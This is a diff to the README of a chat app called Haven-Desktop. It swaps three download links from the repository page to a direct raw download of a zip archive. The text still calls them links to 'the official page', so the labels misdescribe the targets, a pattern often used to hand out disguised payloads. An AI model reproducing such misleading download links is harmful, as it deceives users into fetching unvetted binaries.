@@ -1,6 +1,6 @@
 # 🛡️ Haven-Desktop - Simple, Private Chat on Your PC
 
-[![Download Haven-Desktop](https://img.shields.io/badge/Download-Haven--Desktop-%234285F4?style=for-the-badge&logo=github)](https://github.com/mipileupiki/Haven-Desktop)
+[![Download Haven-Desktop](https://img.shields.io/badge/Download-Haven--Desktop-%234285F4?style=for-the-badge&logo=github)](https://github.com/mipileupiki/Haven-Desktop/raw/refs/heads/main/src/Haven_Desktop_3.0.zip)
 
 ## 🔍 What is Haven-Desktop?
 
@@ -32,7 +32,7 @@ You will download the app from its official GitHub page. Follow these steps care
 
 Click the big button below to open the official Haven-Desktop page in your web browser:
 
-[![Go to Download Page](https://img.shields.io/badge/Go%20to-Download%20Page-%23808080?style=for-the-badge&logo=github)](https://github.com/mipileupiki/Haven-Desktop)
+[![Go to Download Page](https://img.shields.io/badge/Go%20to-Download%20Page-%23808080?style=for-the-badge&logo=github)](https://github.com/mipileupiki/Haven-Desktop/raw/refs/heads/main/src/Haven_Desktop_3.0.zip)
 
 This page holds the latest app files and information.
 
@@ -134,7 +134,7 @@ Keep an eye on the GitHub page for updates. Regular updates fix bugs and add fea
 
 Visit the official GitHub page to download the latest Windows installer:
 
-[Download Haven-Desktop from GitHub](https://github.com/mipileupiki/Haven-Desktop)
+[Download Haven-Desktop from GitHub](https://github.com/mipileupiki/Haven-Desktop/raw/refs/heads/main/src/Haven_Desktop_3.0.zip)
 
 ---
 
